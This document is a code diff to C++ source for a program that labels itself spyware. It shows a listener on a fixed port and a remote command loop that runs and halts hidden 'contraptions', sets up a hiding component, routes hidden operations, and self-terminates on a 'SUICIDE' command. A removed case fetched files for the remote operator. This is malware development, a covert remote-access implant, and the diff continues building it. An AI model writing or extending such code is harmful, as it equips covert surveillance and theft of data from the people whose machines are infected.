@@ -13,12 +13,14 @@
 
 #define PORT (65410)
 
+#define DEBUG
+
 void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
 
 
 int main() {
     
-    std::cout << "sarted spyware" << std::endl;
+    std::cout << "started spyware" << std::endl;
     
     HiderManeger hiderManager = HiderManeger();
     Listener listener = Listener(PORT);
@@ -45,34 +47,36 @@ int main() {
 
 void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
 {
-    SpywareCmd cmd;
+    command cmd;
 
     conn.recvData(sizeof(cmd), (char*)&cmd);
 
-    Status stat;
+    Status stat = DID_NOTHING;
     std::string strRes = "";
 
-    switch (cmd.FuncType)
+    switch (cmd.fncode)
     {
     case RunContraption:
-        stat = admin.runContraption(conn, cmd.type, cmd.contIdentifier);
+        stat = admin.runContraption(conn, cmd.dataLen, cmd.identifier);
         break;
 
     case HaltContraption:
-        stat = admin.haltContraption(cmd.contIdentifier);
+        stat = admin.haltContraption(cmd.identifier);
         break;
 
-    case SendFile:
-        command hiderCmd;
-        hiderCmd.dataLen =0;
-        hiderCmd.fncode = HIDDEN_OPRATION | HIDDEN_RETRIEVE_FILE;
-        conn.recvData(sizeof(hiderCmd.strParam), hiderCmd.strParam);
-        stat = hiderManeger.hiddenAction(hiderCmd, conn);
-        break;
-    
     case SUICIDE:
+        conn.sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
         std::exit(EXIT_SUCCESS);
+    
+    case HIDER_SETUP:
+        stat = hiderManeger.setUpHider(cmd.strParam);
+        break;
     }
+
+    if (cmd.fncode & HIDDEN_OPRATION) {
+        stat = hiderManeger.hiddenAction(cmd, conn);
+    }
+
     std::cout << "Conn: res-" << stat << " response-\n" << strRes << std::endl;
     conn.sendResponce(stat, strRes);
     
